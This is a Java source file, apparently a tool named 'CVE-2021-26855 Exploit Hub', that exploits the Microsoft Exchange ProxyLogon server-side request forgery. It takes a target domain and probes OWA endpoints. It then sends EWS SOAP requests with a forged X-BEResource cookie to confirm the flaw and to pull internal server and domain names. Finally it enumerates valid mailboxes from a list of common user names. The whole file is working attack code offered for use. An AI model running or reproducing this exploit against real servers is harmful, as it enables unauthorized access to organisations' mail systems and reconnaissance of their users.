/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.mycompany.cve_2021_26855_exploit_hub;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 *
 * @author ShacoJX
 */
public class Main {

    public static Scanner scan = new Scanner(System.in);
    public static String FQDN_name;
    public static String Domain_name;
    public static String BE_Server;
    public static String Computer_name;
    public static ArrayList<String> list_vuln_url = new ArrayList<>();
    public static String domain_email = "";
    public static ArrayList<String> list_email = new ArrayList<>();

    public static void main(String[] args) throws IOException {
        System.out.println("======================================");
        System.out.println("=     CVE-2021-26855 Exploit Hub     =");
        System.out.println("=             Code by Shaco JX       =");
        System.out.println("======================================");
        System.out.println("Enter domain target: ");
        String domain = scan.nextLine();
        int status_code = scan(domain);
        
        System.out.println("Status Code: " + status_code);
        if (status_code != 400) {
            System.out.println("[-] Target is not Vuln!");
        } else {
            System.out.println("[-] Sanning !");
            checkVuln(domain);
            
            String list_sub[] = Computer_name.split("\\.");
            for(int i = 1; i< list_sub.length-1; i++){
                domain_email = domain_email + list_sub[i] + ".";
            } 
            domain_email = domain_email + list_sub[list_sub.length-1];
            System.out.println("FQDN Name: " + FQDN_name);
            System.out.println("Computer Name: " + Computer_name);
            System.out.println("Domain Name: "+Domain_name);
            System.out.println("Domain Mail: "+domain_email);
            System.err.println("(*) Enumerate email .....");
            EnumerateEmail(domain,list_vuln_url.get(0));
        }
    }

    public static int scan(String domain) throws IOException {
        String domain_not_http = domain.split("//")[1];
        OkHttpClient client = new OkHttpClient().newBuilder().connectTimeout(15, TimeUnit.SECONDS)
                .build();
        MediaType mediaType = MediaType.parse("text/plain");
        RequestBody body = RequestBody.create(mediaType, "");
        Request request = new Request.Builder()
                .url(domain + "/owa/auth.owa")
                .method("POST", body)
                .addHeader("Host", domain_not_http)
                .addHeader("Connection", "close")
                .addHeader("sec-ch-ua", "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"")
                .addHeader("sec-ch-ua-mobile", "?0")
                .addHeader("Upgrade-Insecure-Requests", "1")
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36")
                .addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
                .addHeader("Sec-Fetch-Site", "none")
                .addHeader("Sec-Fetch-Mode", "navigate")
                .addHeader("Sec-Fetch-User", "?1")
                .addHeader("Sec-Fetch-Dest", "document")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .addHeader("Accept-Language", "en-US,en;q=0.9")
                .build();
        Response response = client.newCall(request).execute();
        FQDN_name = response.header("X-FEServer");
        return response.code();
    }

    public static void checkVuln(String domain) throws IOException {
        String domain_not_http = domain.split("//")[1];
        ArrayList<String> list_uri = new ArrayList<>();
        list_uri.add("/owa/auth/Current/themes/resources/logon.css");
        list_uri.add("/owa/auth/Current/themes/resources/owafont_ja.css");
        list_uri.add("/owa/auth/Current/themes/resources/lgnbotl.gif");
        list_uri.add("/owa/auth/Current/themes/resources/owafont_ko.css");
        list_uri.add("/owa/auth/Current/themes/resources/SegoeUI-SemiBold.eot");
        list_uri.add("/owa/auth/Current/themes/resources/SegoeUI-SemiLight.ttf");
        list_uri.add("/owa/auth/Current/themes/resources/lgnbotl.gif");
        list_uri.add("/owa/auth/Current/");
        list_uri.add("/ecp/default.flt");
        list_uri.add("/ecp/main.css");
        list_uri.add("/ecp/pentest.js");

        for (String u : list_uri) {
            OkHttpClient client = new OkHttpClient().newBuilder().connectTimeout(15, TimeUnit.SECONDS)
                    .build();
            MediaType mediaType = MediaType.parse("text/xml");
            RequestBody body = RequestBody.create(mediaType, "<?xml version='1.0' "
                    + "encoding='utf-8'?>\r\n      "
                    + "<soap:Envelope\r\n       "
                    + "xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/'\r\n       "
                    + "xmlns:t='http://schemas.microsoft.com/exchange/services/2006/types'\r\n       "
                    + "xmlns:m='http://schemas.microsoft.com/exchange/services/2006/messages'\r\n       "
                    + "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>\r\n        "
                    + "<soap:Header>\r\n            "
                    + "<t:RequestServerVersion Version=\"Exchange2016\" />\r\n        "
                    + "</soap:Header>\r\n        "
                    + "<soap:Body>\r\n          "
                    + "<m:FindItem Traversal='Shallow'>\r\n            "
                    + "<m:ItemShape>\r\n              "
                    + "<t:BaseShape>AllProperties</t:BaseShape>\r\n            "
                    + "</m:ItemShape>\r\n            "
                    + "<m:ParentFolderIds>\r\n              "
                    + "<t:DistinguishedFolderId Id='inbox'>\r\n                "
                    + "<t:Mailbox>\r\n                  "
                    + "<t:EmailAddress>admin@domain.ltd</t:EmailAddress>\r\n                "
                    + "</t:Mailbox>\r\n              "
                    + "</t:DistinguishedFolderId>\r\n            "
                    + "</m:ParentFolderIds>\r\n          "
                    + "</m:FindItem>\r\n        "
                    + "</soap:Body>\r\n      "
                    + "</soap:Envelope>");
            Request request = new Request.Builder()
                    .url(domain + u)
                    .method("POST", body)
                    .addHeader("Host", domain_not_http)
                    .addHeader("User-Agent", "Hello-World,")
                    .addHeader("Content-Type", "text/xml")
                    .addHeader("Cookie", "X-BEResource=" + FQDN_name + "/EWS/Exchange.asmx?a=~1942062522;")
                    .build();
            Response response = client.newCall(request).execute();
            if (response.body().string().contains("MessageText")) {
                System.out.println("Path " + u + " is vuln to CVE-2021-26855!");
                list_vuln_url.add(u);
                Computer_name = response.header("X-CalculatedBETarget");
                BE_Server = response.header("X-BEServer");
                Domain_name = response.header("X-DiagInfo");
            } else {
                System.out.println("Path " + u + " is not vuln to CVE-2021-26855!");
            }
        }
    }

    public static void EnumerateEmail(String domain, String path) throws IOException {
        String domain_not_http = domain.split("//")[1];
        ArrayList<String> list_user = new ArrayList<>();
        list_user.add("webmaster");
        list_user.add("support");
        list_user.add("sales");
        list_user.add("contact");
        list_user.add("admin");
        list_user.add("test");
        list_user.add("test01");
        list_user.add("test1");
        list_user.add("guest");
        list_user.add("administrator");
        list_user.add("sysadmin");
        list_user.add("info");
        list_user.add("noreply");
        list_user.add("log");
        list_user.add("no-reply");

        for (String e : list_user) {
            OkHttpClient client = new OkHttpClient().newBuilder().connectTimeout(5, TimeUnit.SECONDS)
                    .build();
            MediaType mediaType = MediaType.parse("text/xml");
            RequestBody body = RequestBody.create(mediaType, "<?xml version=\"1.0\" "
                    + "encoding=\"utf-8\"?>\r\n\t\t\t\t\t\t"
                    + "<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                    + "\r\n\t\t\t\t\t\txmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\""
                    + " \r\n\t\t\t\t\t\txmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" "
                    + "\r\n\t\t\t\t\t\txmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n\t\t\t\t\t\t    "
                    + "<soap:Body>\r\n\t\t\t\t\t\t        "
                    + "<m:GetFolder>\r\n\t\t\t\t\t\t            "
                    + "<m:FolderShape>\r\n\t\t\t\t\t\t                "
                    + "<t:BaseShape>Default</t:BaseShape>\r\n\t\t\t\t\t\t            "
                    + "</m:FolderShape>\r\n\t\t\t\t\t\t            "
                    + "<m:FolderIds>\r\n\t\t\t\t\t\t                "
                    + "<t:DistinguishedFolderId Id=\"inbox\">\r\n\t\t\t\t\t\t                    "
                    + "<t:Mailbox>\r\n\t\t\t\t\t\t                        "
                    + "<t:EmailAddress>"+e+"@"+domain_email+"</t:EmailAddress>\r\n\t\t\t\t\t\t                    "
                    + "</t:Mailbox>\r\n\t\t\t\t\t\t                "
                    + "</t:DistinguishedFolderId>\r\n\t\t\t\t\t\t            "
                    + "</m:FolderIds>\r\n\t\t\t\t\t\t        "
                    + "</m:GetFolder>\r\n\t\t\t\t\t\t    "
                    + "</soap:Body>\r\n\t\t\t\t\t\t</soap:Envelope>");
            Request request = new Request.Builder()
                    .url(domain+path)
                    .method("POST", body)
                    .addHeader("Host", domain_not_http)
                    .addHeader("User-Agent", "Hello-World,")
                    .addHeader("Accept-Language", "en,")
                    .addHeader("Content-Type", "text/xml")
                    .addHeader("Content-Length", "934")
                    .addHeader("Cookie", "X-BEResource="+Domain_name+"/EWS/Exchange.asmx?a=~1942062522;,")
                    .build();
            Response response = client.newCall(request).execute();
            String content = response.body().string();
            if(content.contains("<m:ResponseCode>NoError</m:ResponseCode>")){
                System.out.println("[ Email Found ] "+e+"@"+domain_email);
                System.out.println("------------------------------");
                list_email.add(e+"@"+domain_email);
            }
        }
    }
    
    
    
    
    
    
    
    

}
